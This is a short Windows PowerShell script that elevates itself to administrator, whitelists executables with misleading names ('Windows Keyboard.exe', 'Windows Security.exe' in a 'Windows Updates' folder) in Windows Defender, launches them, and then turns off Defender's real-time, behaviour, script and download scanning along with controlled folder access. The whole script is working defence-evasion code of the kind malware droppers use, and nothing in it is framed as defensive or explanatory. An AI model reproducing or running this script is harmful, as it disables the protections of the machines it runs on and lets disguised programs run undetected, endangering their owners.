# Check if the current session has administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # Relaunch the script with elevated permissions
    Start-Process powershell.exe -Verb RunAs -ArgumentList $MyInvocation.MyCommand.Definition
    exit
}

# The rest of the script goes here and will run with elevated permissions

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force

# Whitelist file
Add-MpPreference -ExclusionPath "$($env:USERPROFILE)\Desktop\Windows Updates\Windows Keyboard.exe" -ExclusionType File

# Run exe
Start-Process -FilePath "$($env:USERPROFILE)\Desktop\Windows Updates\Windows Keyboard.exe" -Confirm:$false | Out-Null
Start-Process -FilePath "$($env:USERPROFILE)\Desktop\Windows Updates\Windows Security.exe" -Confirm:$false | Out-Null

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

$filePath = "Windows Keyboard.exe" # Replace with the path to the file you want to exclude
$exclusionType = "File" # Replace with "Folder" if you want to exclude a folder

Add-MpPreference -ExclusionPath $filePath -ExclusionType $exclusionType

Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled
